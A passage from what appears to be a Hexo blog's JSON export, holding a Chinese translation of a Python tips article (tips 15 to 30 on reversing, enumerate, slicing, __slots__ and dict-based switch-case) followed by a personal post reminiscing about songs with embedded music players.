class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">testList = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>]</div><div class=\"line\">testList.reverse()</div><div class=\"line\">print(testList)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; [5, 3, 1]</span></div></pre></td></tr></table></figure>\n<h3 id=\"在一个循环中翻转并迭代输出\"><a href=\"#在一个循环中翻转并迭代输出\" class=\"headerlink\" title=\"# 在一个循环中翻转并迭代输出\"></a># 在一个循环中翻转并迭代输出</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> element <span class=\"keyword\">in</span> reversed([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>]):</div><div class=\"line\">    print(element)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; 5</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 3</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 1</span></div></pre></td></tr></table></figure>\n<h3 id=\"一行代码翻转字符串\"><a href=\"#一行代码翻转字符串\" class=\"headerlink\" title=\"# 一行代码翻转字符串\"></a># 一行代码翻转字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">\"Test Python\"</span>[::<span class=\"number\">-1</span>]</div></pre></td></tr></table></figure>\n<p>输出为 “nohtyP tseT”</p>\n<h3 id=\"使用切片翻转列表\"><a href=\"#使用切片翻转列表\" class=\"headerlink\" title=\"# 使用切片翻转列表\"></a># 使用切片翻转列表</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>][::<span class=\"number\">-1</span>]</div></pre></td></tr></table></figure>\n<p>上面的命令将会给出输出 [5,3,1]。</p>\n<h2 id=\"贴士-16-玩转枚举\"><a href=\"#贴士-16-玩转枚举\" class=\"headerlink\" title=\"#贴士#16. 玩转枚举\"></a>#贴士#16. 玩转枚举</h2><p>使用枚举可以在循环中方便地找到（当前的）索引：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">testlist = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>]</div><div class=\"line\"><span class=\"keyword\">for</span> i, value <span class=\"keyword\">in</span> enumerate(testlist):</div><div class=\"line\">    print(i, <span class=\"string\">': '</span>, value)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; 0 : 10</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 1 : 20</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 2 : 30</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-17-在-Python-中使用枚举量\"><a href=\"#贴士-17-在-Python-中使用枚举量\" class=\"headerlink\" title=\"贴士#17. 在 Python 中使用枚举量\"></a>贴士#17. 在 Python 中使用枚举量</h2><p>我们可以使用下面的方式来定义枚举量：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shapes</span>:</span></div><div class=\"line\">    Circle, Square, Triangle, Quadrangle = range(<span class=\"number\">4</span>)</div><div class=\"line\"></div><div class=\"line\">print(Shapes.Circle)</div><div class=\"line\">print(Shapes.Square)</div><div class=\"line\">print(Shapes.Triangle)</div><div class=\"line\">print(Shapes.Quadrangle)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; 0</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 1</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 2</span></div><div class=\"line\"><span class=\"comment\">#4-&gt; 3</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-18-从方法中返回多个值\"><a href=\"#贴士-18-从方法中返回多个值\" class=\"headerlink\" title=\"贴士#18. 从方法中返回多个值\"></a>贴士#18. 从方法中返回多个值</h2><p>并没有太多编程语言支持这个特性，然而 Python 中的方法确实（可以）返回多个值，请参见下面的例子来看看这是如何工作的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># function returning multiple values.</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">x</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Calling the above function.</span></div><div class=\"line\">a, b, c, d = x()</div><div class=\"line\"></div><div class=\"line\">print(a, b, c, d)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 1 2 3 4</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-19-使用-运算符（splat-operator）来-unpack-函数参数\"><a href=\"#贴士-19-使用-运算符（splat-operator）来-unpack-函数参数\" class=\"headerlink\" title=\"贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数\"></a>贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数</h2><ul>\n<li>运算符（splat operator）提供了一个艺术化的方法来 unpack 参数列表，为清楚起见请参见下面的例子：<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test</span><span class=\"params\">(x, y, z)</span>:</span></div><div class=\"line\">    print(x, y, z)</div><div class=\"line\"></div><div class=\"line\">testDict = &#123;<span class=\"string\">'x'</span>: <span class=\"number\">1</span>, <span class=\"string\">'y'</span>: <span class=\"number\">2</span>, <span class=\"string\">'z'</span>: <span class=\"number\">3</span>&#125; </div><div class=\"line\">testList = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>]</div><div class=\"line\"></div><div class=\"line\">test(*testDict)</div><div class=\"line\">test(**testDict)</div><div class=\"line\">test(*testList)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; x y z</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 1 2 3</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 10 20 30</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"贴士-20-使用字典来存储选择操作\"><a href=\"#贴士-20-使用字典来存储选择操作\" class=\"headerlink\" title=\"贴士#20. 使用字典来存储选择操作\"></a>贴士#20. 使用字典来存储选择操作</h2><p>我们能构造一个字典来存储表达式：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">stdcalc = &#123;</div><div class=\"line\">    <span class=\"string\">'sum'</span>: <span class=\"keyword\">lambda</span> x, y: x + y,</div><div class=\"line\">    <span class=\"string\">'subtract'</span>: <span class=\"keyword\">lambda</span> x, y: x - y</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">print(stdcalc[<span class=\"string\">'sum'</span>](<span class=\"number\">9</span>,<span class=\"number\">3</span>))</div><div class=\"line\">print(stdcalc[<span class=\"string\">'subtract'</span>](<span class=\"number\">9</span>,<span class=\"number\">3</span>))</div></pre></td></tr></table></figure></p>\n<h2 id=\"贴士-21-一行代码计算任何数的阶乘\"><a href=\"#贴士-21-一行代码计算任何数的阶乘\" class=\"headerlink\" title=\"贴士#21. 一行代码计算任何数的阶乘\"></a>贴士#21. 一行代码计算任何数的阶乘</h2><h3 id=\"Python-2-x\"><a href=\"#Python-2-x\" class=\"headerlink\" title=\"Python 2.x.\"></a>Python 2.x.</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">result = (<span class=\"keyword\">lambda</span> k: reduce(int.__mul__, range(<span class=\"number\">1</span>,k+<span class=\"number\">1</span>),<span class=\"number\">1</span>))(<span class=\"number\">3</span>)</div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 6</span></div></pre></td></tr></table></figure>\n<h3 id=\"Python-3-x\"><a href=\"#Python-3-x\" class=\"headerlink\" title=\"Python 3.x.\"></a>Python 3.x.</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> functools</div><div class=\"line\">result = (<span class=\"keyword\">lambda</span> k: functools.reduce(int.__mul__, range(<span class=\"number\">1</span>,k+<span class=\"number\">1</span>),<span class=\"number\">1</span>))(<span class=\"number\">3</span>)</div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 6</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-22-找到列表中出现最频繁的数\"><a href=\"#贴士-22-找到列表中出现最频繁的数\" class=\"headerlink\" title=\"贴士#22. 找到列表中出现最频繁的数\"></a>贴士#22. 找到列表中出现最频繁的数</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">test = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>]</div><div class=\"line\">print(max(set(test), key=test.count))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 4</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-23-重置递归限制\"><a href=\"#贴士-23-重置递归限制\" class=\"headerlink\" title=\"贴士#23. 重置递归限制\"></a>贴士#23. 重置递归限制</h2><p>Python 限制递归次数到 1000，我们可以重置这个值：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"></div><div class=\"line\">x=<span class=\"number\">1001</span></div><div class=\"line\">print(sys.getrecursionlimit())</div><div class=\"line\"></div><div class=\"line\">sys.setrecursionlimit(x)</div><div class=\"line\">print(sys.getrecursionlimit())</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 1000</span></div><div class=\"line\"><span class=\"comment\">#-&gt; 1001</span></div></pre></td></tr></table></figure>\n<p>请只在必要的时候采用上面的技巧。</p>\n<h2 id=\"贴士-24-检查一个对象的内存使用\"><a href=\"#贴士-24-检查一个对象的内存使用\" class=\"headerlink\" title=\"贴士#24. 检查一个对象的内存使用\"></a>贴士#24. 检查一个对象的内存使用</h2><p>在 Python 2.7 中，一个 32 比特的整数占用 24 字节，在 Python 3.5 中占用 28 字节。为确定内存使用，我们可以调用 getsizeof 方法：</p>\n<p>在 Python 2.7 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">x=<span class=\"number\">1</span></div><div class=\"line\">print(sys.getsizeof(x))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 24</span></div></pre></td></tr></table></figure>\n<p>在 Python 3.5 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">x=<span class=\"number\">1</span></div><div class=\"line\">print(sys.getsizeof(x))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 28</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-25-使用-slots-来减少内存开支\"><a href=\"#贴士-25-使用-slots-来减少内存开支\" class=\"headerlink\" title=\"贴士#25. 使用 slots 来减少内存开支\"></a>贴士#25. 使用 <strong>slots</strong> 来减少内存开支</h2><p>你是否注意到你的 Python 应用占用许多资源特别是内存？有一个技巧是使用 <strong>slots</strong> 类变量来在一定程度上减少内存开支。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileSystem</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, files, folders, devices)</span>:</span></div><div class=\"line\">        self.files = files</div><div class=\"line\">        self.folders = folders</div><div class=\"line\">        self.devices = devices</div><div class=\"line\">print(sys.getsizeof( FileSystem ))</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileSystem1</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\"></div><div class=\"line\">    __slots__ = [<span class=\"string\">'files'</span>, <span class=\"string\">'folders'</span>, <span class=\"string\">'devices'</span>]</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, files, folders, devices)</span>:</span></div><div class=\"line\">        self.files = files</div><div class=\"line\">        self.folders = folders</div><div class=\"line\">        self.devices = devices</div><div class=\"line\"></div><div class=\"line\">print(sys.getsizeof( FileSystem1 ))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#In Python 3.5</span></div><div class=\"line\"><span class=\"comment\">#1-&gt; 1016</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 888</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 经测试 在我的 win10 python27 中跑出的结果是：</span></div><div class=\"line\"><span class=\"comment\">#1-&gt; 452</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 512</span></div></pre></td></tr></table></figure>\n<p>很明显，你可以从结果中看到确实有内存使用上的节省，但是你只应该在一个类的内存开销不必要得大时才使用 <strong>slots</strong>。只在对应用进行性能分析后才使用它，不然地话，你只是使得代码难以改变而没有真正的益处。</p>\n<p>所以，这种比较方式是不那么让人信服的，使用 <strong>slots</strong> 主要是用以限定对象的属性信息，另外，当生成对象很多时花销可能会小一些，具体可以参见 <a href=\"https://docs.python.org/3/reference/datamodel.html?highlight=__slots__#object.__slots__\" target=\"_blank\" rel=\"external\">python 官方文档</a>:</p>\n<p>The slots declaration takes a sequence of instance variables and reserves just enough space in each instance to hold a value for each variable. Space is saved because dict is not created for each instance. </p>\n<p>也可参考廖雪峰老师的 <a href=\"http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013868200605560b1bd3c660bf494282ede59fee17e781000\" target=\"_blank\" rel=\"external\">使用<strong>slots</strong></a> </p>\n<h2 id=\"贴士-26-使用-lambda-来模仿输出方法\"><a href=\"#贴士-26-使用-lambda-来模仿输出方法\" class=\"headerlink\" title=\"贴士#26. 使用 lambda 来模仿输出方法\"></a>贴士#26. 使用 lambda 来模仿输出方法</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">lprint=<span class=\"keyword\">lambda</span> *args:sys.stdout.write(<span class=\"string\">\" \"</span>.join(map(str,args)))</div><div class=\"line\">lprint(<span class=\"string\">\"python\"</span>, <span class=\"string\">\"tips\"</span>,<span class=\"number\">1000</span>,<span class=\"number\">1001</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; python tips 1000 1001</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-27-从两个相关的序列构建一个字典\"><a href=\"#贴士-27-从两个相关的序列构建一个字典\" class=\"headerlink\" title=\"贴士#27. 从两个相关的序列构建一个字典\"></a>贴士#27. 从两个相关的序列构建一个字典</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">t1 = (<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>)</div><div class=\"line\">t2 = (<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>)</div><div class=\"line\"></div><div class=\"line\">print(dict (zip(t1,t2)))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; &#123;1: 10, 2: 20, 3: 30&#125;</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-28-一行代码搜索字符串的多个前后缀\"><a href=\"#贴士-28-一行代码搜索字符串的多个前后缀\" class=\"headerlink\" title=\"贴士#28. 一行代码搜索字符串的多个前后缀\"></a>贴士#28. 一行代码搜索字符串的多个前后缀</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">print(<span class=\"string\">\"http://www.google.com\"</span>.startswith((<span class=\"string\">\"http://\"</span>, <span class=\"string\">\"https://\"</span>)))</div><div class=\"line\">print(<span class=\"string\">\"http://www.google.co.uk\"</span>.endswith((<span class=\"string\">\".com\"</span>, <span class=\"string\">\".co.uk\"</span>)))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; True</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; True</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-29-不使用循环构造一个列表\"><a href=\"#贴士-29-不使用循环构造一个列表\" class=\"headerlink\" title=\"贴士#29. 不使用循环构造一个列表\"></a>贴士#29. 不使用循环构造一个列表</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> itertools</div><div class=\"line\">test = [[<span class=\"number\">-1</span>, <span class=\"number\">-2</span>], [<span class=\"number\">30</span>, <span class=\"number\">40</span>], [<span class=\"number\">25</span>, <span class=\"number\">35</span>]]</div><div class=\"line\">print(list(itertools.chain.from_iterable(test)))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; [-1, -2, 30, 40, 25, 35]</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-30-在-Python-中实现一个真正的-switch-case-语句\"><a href=\"#贴士-30-在-Python-中实现一个真正的-switch-case-语句\" class=\"headerlink\" title=\"贴士#30. 在 Python 中实现一个真正的 switch-case 语句\"></a>贴士#30. 在 Python 中实现一个真正的 switch-case 语句</h2><p>下面的代码使用一个字典来模拟构造一个 switch-case。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xswitch</span><span class=\"params\">(x)</span>:</span> </div><div class=\"line\">    <span class=\"keyword\">return</span> xswitch._system_dict.get(x, <span class=\"keyword\">None</span>)</div><div class=\"line\"></div><div class=\"line\">xswitch._system_dict = &#123;<span class=\"string\">'files'</span>: <span class=\"number\">10</span>, <span class=\"string\">'folders'</span>: <span class=\"number\">5</span>, <span class=\"string\">'devices'</span>: <span class=\"number\">2</span>&#125;</div><div class=\"line\"></div><div class=\"line\">print(xswitch(<span class=\"string\">'default'</span>))</div><div class=\"line\">print(xswitch(<span class=\"string\">'devices'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; None</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 2</span></div></pre></td></tr></table></figure>\n<p>结语 – 给程序员的基本 Python 贴士与技巧</p>\n<p>我们希望上述的基本的 Python 贴士与技巧可以帮助你快速地 &amp; 有效地完成任务，你可以在作业与项目中使用他们。</p>\n<p>听从你的回馈会使我们变得更好，所以请分享你的想法。</p>\n<p>你甚至可以要求我们写一个你选择的话题，我们会将其加入到我们的写作列表中。【*】</p>\n<p>最后，如果你喜欢这个文章，请在社交媒体上分享给你的朋友。</p>\n<p>坚持学习，</p>\n<p>TechBeamers.</p>\n<blockquote>\n<p>本文由 伯乐在线 - 阿喵 翻译，艾凌风 校稿。英文出处：Meenakshi Agarwal。</p>\n</blockquote>"},{"title":"那些萦绕在我记忆里的一些歌曲(未完 更于2017-04-27)","date":"2017-04-26T16:19:49.000Z","layout":"post","comments":1,"--reward":true,"_content":"\n> 他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。\n\n![walk_away](/Image/walk_away.jpg)\n\n<!--more-->\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=277722&auto=0&height=66\"></iframe>\n\n蛮喜欢下雨天，小时候总是疯疯癫癫的跑出去淋雨。  \n\n长大了，一个人的时候总会望着窗外的雨出神，有时会想着谁，有时不知道该想想谁。\n\n一旦发生过这样的事情，便很难在下雨天抑制住自己的思绪。\n\n有时会想让自己不去想，那种空灵的感觉总是让人没办法拒绝又会浪费掉精力和时间。\n\n印象中克制的最好的一次大概是听着吵吵的音乐，在雨中阴沉着脸赶路吧。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=165364&auto=0&height=66\"></iframe> \n\n汪苏泷、徐良和许嵩。好多人为了凸显自己的音乐品味对他们嗤之以鼻。\n\n现在喊麦的mc们也被骂的很惨，我不觉得自己多有品位。\n\n讨厌的东西我不会去听，也不会去关注相关的任何讯息，我不喜欢你，所以我的世界里没有你，很简单。\n\n当初他们三位的歌曲陪伴我度过了一个又一个周末，一个又一个朝阳到余晖。\n\n现在再听起他们的歌，不会像当初那么陶醉，也没有青涩时期的画面扑面而来，情绪也不会跟着歌曲进入副歌而忽起波澜。\n\n像评论里说的：“现在听没有那时的感觉了。真的是回不去了[心碎]。”\n\n我始终觉得，让你困在过去的歌曲，不是你应该听的歌。\n\n我在听的，多半是这段回不去的路，和这路上的每一步吧。\n\n\n<script type=\"text/javascript\" src=\"http://www.xiami.com/widget/player-single?uid=0&sid=380252&mode=js\"></script>\n\n梁静茹的歌总是会让你体会到那种纯粹的感情\n\n“我可以假装看不见，也可以偷偷的想念”\n\n“知了也睡了，安心的睡了” \n\n那时的我们，向往着这种连空气都会变得很轻松的感情。\n\n当初单纯，幸运的是，我们嘴边哼着的歌，还要更单纯。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=28191530&auto=0&height=66\"></iframe>\n\n当年被胡彦斌这骚气的声线与唱法镇住了，听了一次想忘都难。\n\n当初有一个可以打电话点歌、点视频的互动电视频道，视频平均4分钟左右一段，2元点一次。\n\n在没人点播的时候，为了怕观众无聊，放的就是这首胡彦斌的歌，当下俗称的BMG就是它了。\n\n如果你想看一集动画片，你可能要点4-5次才能看完一集。\n\n想想当初挺有意思的，每天守着这个台，有一集没一集的跟着点播的土豪瞎看。\n\n有时看一集动画可能会被插播进来七八次歌曲MV，时间成本也蛮高的。\n\n守着电视的小伙伴们也慢慢的有了默契，只要你点了动画片的第一part，总会有其他小伙伴帮你点完。\n\n众筹的思想在小朋友的身上已经生根发芽了。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=69827&auto=0&height=66\"></iframe>\n\n那时我还听不懂。\n\n现在想想：\n\n“太多的借口”\n\n“太多的理由”\n\n“为了爱情我也背叛了所有”\n\n“如果你想离开我”\n\n“就别再畏畏缩缩”\n\n乍一听，是一个痴情人被爱情折磨的终于不想承受的故事。\n\n可是仔细想想，如果真想离开你，还会找借口和理由吗？\n\n既已不再留恋，何必处处遮掩？\n\n你含泪看着对方的时候，又怎知对方不是在含泪望着你。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=307525&auto=0&height=66\"></iframe>  \n\n悄悄地喜欢一个人\n\n把握的恰到好处\n\n刚好瞒着他的同时，被全世界看穿了自己\n\n在那个人身上用尽了我们能表达出来的所有情绪\n\n把每一个电视剧里的故事都在脑海中排练了一遍\n\n一个不经意的动作，一句很自然的话\n\n能让自己对着自己在脑海中低语很久\n\n思绪随着天色浅浅有了光亮\n\n才叹着气睡去\n\n其实，我们只是刚好在那个时候\n\n需要完全陌生的人\n\n来感动自己\n\n不是我们做了那么多，最后却只感动了自己\n\n而是我们所做的一切，都只是为了感动自己","source":"_posts/sgbtLC.md","raw":"---\ntitle: 那些萦绕在我记忆里的一些歌曲(未完 更于2017-04-27) \ndate: 2017-4-27 00:19:49\nlayout: post\ncomments: true\n--reward: true\ntags:\n    - Leo\n    - 音乐\n---\n\n> 他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。\n\n![walk_away](/Image/walk_away.jpg)\n\n<!--more-->\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=277722&auto=0&height=66\"></iframe>\n\n蛮喜欢下雨天，小时候总是疯疯癫癫的跑出去淋雨。  \n\n长大了，一个人的时候总会望着窗外的雨出神，有时会想着谁，有时不知道该想想谁。\n\n一旦发生过这样的事情，便很难在下雨天抑制住自己的思绪。\n\n有时会想让自己不去想，那种空灵的感觉总是让人没办法拒绝又会浪费掉精力和时间。\n\n印象中克制的最好的一次大概是听着吵吵的音乐，在雨中阴沉着脸赶路吧。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=165364&auto=0&height=66\"></iframe> 